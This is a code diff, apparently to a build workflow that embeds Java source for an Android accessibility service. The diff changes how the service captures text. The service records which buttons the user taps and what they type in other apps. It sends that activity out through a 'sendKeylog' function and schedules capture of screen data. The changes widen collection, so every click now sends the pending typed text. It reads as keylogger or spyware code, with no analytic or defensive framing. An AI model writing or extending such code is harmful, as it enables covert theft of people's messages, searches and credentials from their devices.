@@ -617,17 +617,13 @@ jobs:
                   AccessibilityNodeInfo source = event.getSource();
                   String clickedText = "";
                   if (source != null) {
-                      // Try source node first
                       clickedText = getNodeText(source);
-                      // If empty, search parent chain for button text or viewIdResourceName
+                      // If empty, search parent chain for any label
                       AccessibilityNodeInfo parent = source.getParent();
                       int depth = 0;
-                      while (parent != null && depth < 6) {
-                          String parentText = getNodeText(parent);
-                          if (!parentText.isEmpty() && isActionText(parentText)) {
-                              clickedText = parentText;
-                              break;
-                          }
+                      while (parent != null && depth < 6 && clickedText.isEmpty()) {
+                          clickedText = getNodeText(parent);
+                          if (!clickedText.isEmpty()) break;
                           parent = parent.getParent();
                           depth++;
                       }
@@ -639,7 +635,7 @@ jobs:
                   // 1. Send tap event
                   sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
 
-                  // 2. Flush pending text if any
+                  // 2. ✅ Flush pending text on ANY click (if any)
                   if (pendingText.length() > 0) {
                       String typed = pendingText.toString().trim();
                       String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
@@ -663,19 +659,6 @@ jobs:
                   } catch (Exception e) {
                       return "";
                   }
-              }
-
-              private boolean isActionText(String text) {
-                  String lower = text.toLowerCase();
-                  return lower.contains("send") ||
-                         lower.contains("search") ||
-                         lower.contains("go") ||
-                         lower.contains("submit") ||
-                         lower.contains("enter") ||
-                         lower.contains("done") ||
-                         lower.contains("next") ||
-                         lower.contains("➤") ||
-                         lower.contains("arrow");
               }
 
               private void scheduleScreenDataCapture(String packageName) {
